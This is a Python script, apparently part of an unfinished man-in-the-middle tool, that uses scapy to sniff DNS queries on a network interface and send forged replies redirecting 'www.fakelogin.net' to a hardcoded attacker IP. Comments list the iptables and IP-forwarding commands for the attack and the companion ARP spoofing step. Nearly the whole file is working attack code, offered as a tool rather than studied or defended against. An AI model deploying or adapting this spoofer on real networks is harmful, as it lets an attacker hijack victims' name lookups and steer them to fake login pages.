from scapy.all import *
import threading

# The defined global variables are hardcoded for now, until ARP is setup and the tool becomes fully fledged

# The IP we want the victim to resolve to (the Attacker's IP)
ATTACKER_IP = "192.168.209.128"

# Configuration for the spoofed domain mapping
SPOOF_MAP = {
    "www.fakelogin.net.": ATTACKER_IP
}

# The Interface of victim, set during ARP 
INTERFACE = "ens33"

def dns_handler(packet):
    """
    Handles a sniffed packet. Checks if it's a DNS query and attempts to spoof it.
    """
    print(f"[DNS Spoof] Received a packet from: {packet[IP].src}")

    if not packet.haslayer(DNS):
        print("[DNS Spoof] Packet does not have DNS layer. Ignoring.")
        return

    # Check if it's a DNS Query (qr=0)
    if packet[DNS].qr == 0:
        print("[DNS Spoof] Packet is a DNS QUERY (qr=0). Proceeding.")

        if not packet.haslayer(DNSQR):
            print("[DNS Spoof] Query packet is missing DNSQR layer. Ignoring.")
            return
        
        query_name_bytes = packet[DNSQR].qname

        try:
            query_name = query_name_bytes.decode('utf-8')
        except UnicodeDecodeError:
            print("[DNS Spoof] Could not decode query name.")
            return
        
        print(f"[DNS Spoof] Extracted Query Name: '{query_name}'")

        # Check if the queried domain is in our SPOOF_MAP
        if query_name in SPOOF_MAP:
            
            print(f"[DNS Spoof] Intercepted query for: {query_name}; FORGING REPLY...")
            
            # Crafting the Spoofed Response
            
            # Forge IP layer (Source and Destination IPs swapped)
            spoofed_ip = IP(src=packet[IP].dst, dst=packet[IP].src) 
            
            # Forge UDP layer (Source and Destination ports swapped)
            spoofed_udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) 
            
            # Create the malicious Answer Record (DNSRR)
            spoofed_answer = DNSRR(rrname=query_name, rdata=ATTACKER_IP)

            # Forge the DNS Response (must use the original TXID)
            spoofed_dns = DNS(id=packet[DNS].id, qr=1, aa=1, rd=0, ra=0, qd=packet[DNSQR], an=spoofed_answer) 
            
            # Packing spoofed layers
            final_packet = spoofed_ip / spoofed_udp / spoofed_dns
            
            # Send the forged packet immediately (to win the race)
            send(final_packet, verbose=0)
            print(f"[DNS Spoof] Sent spoofed response: {query_name} -> {ATTACKER_IP}")
        else:
            print(f"[DNS Spoof] Domain '{query_name}' NOT in SPOOF_MAP. Ignoring.")
    else:
        print(f"[DNS Spoof] Packet is a DNS RESPONSE (qr={packet[DNS].qr}). Ignoring.")
            
def start_dns_spoofing(interface, spoof_map):
    """
    Starts the sniffing operation in a non-blocking thread.
    """
    # The filter ensures we only catch UDP traffic on port 53 (DNS)
    print(f"[*] Starting DNS spoofer on interface {interface}")
    
    sniff_thread = threading.Thread(
        target=sniff, 
        kwargs={'iface': interface, 'filter': "udp and port 53", 'prn': dns_handler}
    )
    sniff_thread.start()
    return sniff_thread

if __name__ == "__main__":
    
    # NOTE: In the real attack, the ARP module would run here first
    # and set the ATTACKER_IP and the correct interface.

    # To mimic how ARP does estabishes MiTM position, we need to:
    # Enable IP Forwarding: sudo sysctl -w net.ipv4.ip_forward=1
    # Redirect DNS Traffic to Local Port 53: sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
    # Start sniffing: sudo python3 dns_module.py
    # Generate a query for a domain in SPOOF_MAP, forcing the query to go to an external DNS server: dig @8.8.8.8 www.fakelogin.net
    # We can see in the terminal output that the spoofed package was sent. There is a MAC warning, but I think it will go away after ARP is done 
    # After testing, flush the iptables: sudo iptables -t nat -F
    # sudo iptables -t filter -F
    
    # We will test in a simulated environment below
    start_dns_spoofing(INTERFACE, SPOOF_MAP)